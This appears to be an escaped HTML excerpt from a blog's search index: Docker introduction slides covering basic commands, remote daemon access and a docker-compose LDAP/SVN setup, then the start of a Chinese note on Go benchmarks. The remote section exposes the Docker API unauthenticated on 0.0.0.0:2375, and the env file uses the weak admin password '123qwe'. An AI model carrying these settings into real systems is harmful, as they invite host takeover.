data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -t program\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -f Dockerfile -t test_mysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -t hello:v1.1 --build-arg dist\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/tmp/hello --build-arg projectDir\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/hello\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-build\"\u003edocker build\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eBefore build\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -f docker/Dockerfile1 -t test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -f docker/Dockerfile2 -t test2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"docker-image\"\u003edocker image\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eAfter build\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-run-and-rm\"\u003edocker run AND rm\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRun container1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run -d --name container1 test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRun container2\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run -d --name container2 test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList alive containers\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker ps\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all containers\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker ps -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRemove alive container\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker rm -f container1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all containers\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker ps -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRemove exit container\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker rm container2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all containers\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker ps -a\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-pull-and-rmi\"\u003edocker pull AND rmi\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ePull alpine image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker pull alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-rmi\"\u003edocker rmi\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eRemove alpine image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker rmi alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList all image\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker image ls\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"prune\"\u003eprune\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker system prune -f --volumes\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"docker-history\"\u003edocker history\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eHistory of test1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker history test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eHistory of mysql:8\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker history mysql:8\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"docker-remote\"\u003eDocker remote\u003c/h2\u003e\n\u003ch3 id=\"edit-service-file\"\u003eEdit service file\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# /lib/systemd/system/docker.service\nExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H tcp://0.0.0.0:2375\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"restart-service\"\u003eRestart service\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esystemctl daemon-reload\nsystemctl restart docker\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"specify-docker_host\"\u003eSpecify DOCKER_HOST\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e. docker/status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eGREEN\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eList images on 192.168.185.9\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eRESET\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDOCKER_HOST\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e192.168.185.9:2375 docker images\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"docker-compose\"\u003eDocker-compose\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eversion\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003esvn\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ezeyanlin/svn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_HOSTS=${LDAP_HOSTS}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_BASE_DN=${LDAP_BASE_DN}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_BIND_DN=${LDAP_BIND_DN}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_ADMIN_PASS=${LDAP_ADMIN_PASS}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8000\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e3690\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e3690\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edepends_on\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eldap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eldap\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ezeyanlin/openldap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_DOMAIN=${LDAP_DOMAIN}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_ADMIN_PASS=${LDAP_ADMIN_PASS}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e636\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e636\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ephp\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ezeyanlin/phpldapadmin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eLDAP_HOSTS=${LDAP_HOSTS}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edepends_on\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eldap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch3 id=\"env\"\u003eEnv\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_HOSTS\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eldap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_DOMAIN\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;knowhow.fun\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_BASE_DN\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dc=knowhow,dc=fun\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_BIND_DN\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cn=admin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eLDAP_ADMIN_PASS\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;123qwe\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Docker","introduction","slides"],"title":"Docker Introduction"},{"categories":["URL","Go","Benchmark","Testing"],"contents":" Golang 基准测试 基本使用 基准测试常用于代码性能测试，函数需要导入 testing 包，并定义以 Benchmark 开头的函数， 参数为 testing.B 指针类型，在测试函数中循环调用函数多次\n➜ go test -bench=. -run=none goos: darwin goarch: amd64 pkg: pkg06 cpu: Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz BenchmarkFib-12 250 4682682 ns/op PASS ok pkg06 1.875s ➜ go test -bench=. -benchmem -run=none goos: darwin goarch: amd64 pkg: pkg06 cpu: Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz BenchmarkFib-12 249 4686452 ns/op 0 B/op 0 allocs/op PASS ok pkg06 1.854s bench 的工作原理 基准测试函数会被一直调用直到 b.N 无效，它是基准测试循环的次数 b.N 从 1 开始，如果基准测试函数在 1 秒内就完成 (默认值)，则 b.N 增加，并再次运行基准测试函数 b.N 的值会按照序列 1,2,5,10,20,50,... 增加，同时再次运行基准测测试函数 